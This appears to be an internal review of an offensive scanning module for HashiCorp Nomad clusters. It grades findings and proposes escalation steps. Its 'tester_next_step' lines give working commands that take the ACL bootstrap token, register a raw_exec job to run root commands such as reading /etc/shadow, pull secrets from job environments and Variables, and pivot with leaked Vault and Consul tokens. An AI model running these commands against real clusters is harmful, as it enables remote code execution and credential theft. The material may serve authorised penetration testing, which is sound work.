summary: Best-in-tranche for T3 promotions: already attempts /v1/acl/bootstrap when reads are gated (which yields a management token if the cluster was never bootstrapped), extracts Vault/Consul integration tokens from /v1/agent/self, enumerates /v1/vars values, and probes /v1/jobs/parse for writable API. Missing: doesn't chain the bootstrap-token or leaked Vault/Consul token into the corresponding vault/consul modules automatically, and doesn't attempt raw_exec job registration.

findings.tier_evidence: acl.enabled=false AND jobs/allocations/nodes read = deterministic anon-read.
findings.promotion_notes: Follow-on already covered by nomad_job_submit_rce and nomad_job_spec_secrets — chain into raw_exec-driver job registration for RCE on client nodes.
findings.tester_next_step: curl -sX POST http://<ip>:4646/v1/jobs -d @rawexec-job.json — with driver=raw_exec and command=/bin/id — runs as root on a client node.

findings.promotion_notes: Already covered — the module falls back to bootstrap probe when reads are gated.
findings.tester_next_step: curl -sX POST http://<ip>:4646/v1/acl/bootstrap — if 200, cluster management token in response.

findings.title_pattern: Nomad ACL system un-bootstrapped — cluster-root token obtained
findings.tier_evidence: POST /v1/acl/bootstrap returned 200 with a real SecretID — cluster-root token captured in-module.
findings.promotion_notes: Chain to nomad_job_submit_rce for actual code-exec on any client (raw_exec/exec/docker driver). Auto-register a canary job, capture stdout, terminate the job.
findings.tester_next_step: Use captured SecretID: X-Nomad-Token: <token> to POST a raw_exec job that runs `id;hostname;cat /etc/shadow` on the client — full node compromise.

findings.title_pattern: Nomad agent/self leaks Vault/Consul integration tokens
findings.tier_evidence: Actual Vault/Consul tokens returned in-clear from /v1/agent/self and captured — reusable credentials.
findings.promotion_notes: Feed the Vault token into vault module (vault kv list, vault kv get) and Consul token into consul module — full cross-service pivot. Wire into known_creds keyed by (service, address).
findings.tester_next_step: VAULT_ADDR=<leaked_addr> VAULT_TOKEN=<leaked_tok> vault kv list secret/; CONSUL_HTTP_ADDR=<leaked_addr> CONSUL_HTTP_TOKEN=<leaked_tok> consul kv get -recurse

findings.title_pattern: Nomad job specs disclose task Env / Templates / Vault refs
findings.tier_evidence: Env keys and Template destinations enumerated from anon /v1/job/:id — key names not values; recce doesn't decode template contents.
findings.promotion_notes: For each env, capture the VALUE (t.Env is already a k/v dict — module drops values, keeps keys only). Fix: capture matching values like docker_env_secrets does. Also GET rendered templates from allocation FS via /v1/client/fs/cat.
findings.tester_next_step: curl -s http://<ip>:4646/v1/job/<id> | jq -r '.TaskGroups[].Tasks[] | .Env' — env values in clear; curl http://<ip>:4646/v1/client/fs/cat/<allocid>?path=secrets/env — rendered template with real secrets.

findings.title_pattern: Nomad HCL parse endpoint accepts anonymous submissions
findings.tier_evidence: POST /v1/jobs/parse returning 200 proves the parse route is anon-reachable; actual job registration and command execution not attempted.
findings.promotion_notes: Full chain: POST /v1/jobs with a raw_exec/exec job that runs id;hostname;whoami and reads stdout via /v1/client/fs/logs. Intrusive but non-destructive if scoped and torn down.
findings.tester_next_step: cat > job.json <<'EOF' {"Job":{"ID":"pwn","Type":"batch","Datacenters":["dc1"],"TaskGroups":[{"Name":"g","Tasks":[{"Name":"t","Driver":"raw_exec","Config":{"command":"/bin/sh","args":["-c","id>/tmp/pwn"]}}]}]}} EOF; curl -X POST http://<ip>:4646/v1/jobs -d @job.json

findings.tier_evidence: GET /v1/var/:path returns cleartext Items and recce captures the key names + values_readable flag — actual secret material in hand (though only keys, not values, are captured).
findings.promotion_notes: Already T3; small polish would capture the VALUE bytes not just the key names so shared known_creds can pool them.
findings.tester_next_step: curl -s http://<ip>:4646/v1/vars | jq -r '.[].Path' | while read p; do curl -s "http://<ip>:4646/v1/var/$p" | jq .Items; done

proposed_shared_surface_consumers: known_creds (Vault/Consul integration tokens, job env values, Variables values)
vault/consul module cross-invocation with looted tokens
